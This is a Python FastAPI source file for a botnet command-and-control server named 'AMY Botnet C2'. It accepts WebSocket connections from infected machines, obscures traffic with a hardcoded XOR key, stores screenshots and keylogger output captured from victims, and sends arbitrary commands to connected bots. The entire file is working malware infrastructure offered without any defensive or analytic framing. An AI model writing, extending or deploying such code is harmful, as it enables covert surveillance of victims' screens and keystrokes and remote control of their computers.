from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
import asyncio
import base64
import os
from datetime import datetime

app = FastAPI(title="AMY Botnet C2")

active_bots = {}

os.makedirs("screenshots", exist_ok=True)
os.makedirs("logs", exist_ok=True)

KEY = b"AMY_BOTNET_2026_SECRET_KEY_1337"

def encrypt_message(msg: str) -> str:
    encrypted = bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(msg.encode('utf-8'))])
    return base64.b64encode(encrypted).decode('utf-8')

def decrypt_message(encoded: str) -> str:
    encrypted = base64.b64decode(encoded)
    decrypted = bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(encrypted)])
    return decrypted.decode('utf-8', errors='ignore')

@app.get("/", response_class=HTMLResponse)
async def dashboard():
    try:
        with open("ui/index.html", encoding="utf-8") as f:
            return f.read()
    except:
        return HTMLResponse("<h1>UI file not found</h1>", status_code=404)

@app.websocket("/ws/{bot_id}")
async def bot_connection(websocket: WebSocket, bot_id: str):
    await websocket.accept()
    active_bots[bot_id] = websocket
    print(f"[+] Bot {bot_id} connected")
    try:
        while True:
            encrypted_data = await websocket.receive_text()
            data = decrypt_message(encrypted_data)
            if data.startswith("SCREENSHOT:"):
                img_data = base64.b64decode(data[11:])
                filename = f"screenshots/{bot_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
                with open(filename, "wb") as f:
                    f.write(img_data)
            elif data.startswith("KEYLOG:"):
                with open(f"logs/{bot_id}_keylog.txt", "a", encoding="utf-8") as f:
                    f.write(data[7:] + "\n")
    except WebSocketDisconnect:
        active_bots.pop(bot_id, None)

@app.get("/bots")
async def list_bots():
    return {"bots": list(active_bots.keys())}

@app.post("/command")
async def send_command(bot_id: str, command: str):
    if bot_id in active_bots:
        await active_bots[bot_id].send_text(encrypt_message(command))
        return {"status": "sent"}
    return {"status": "error"}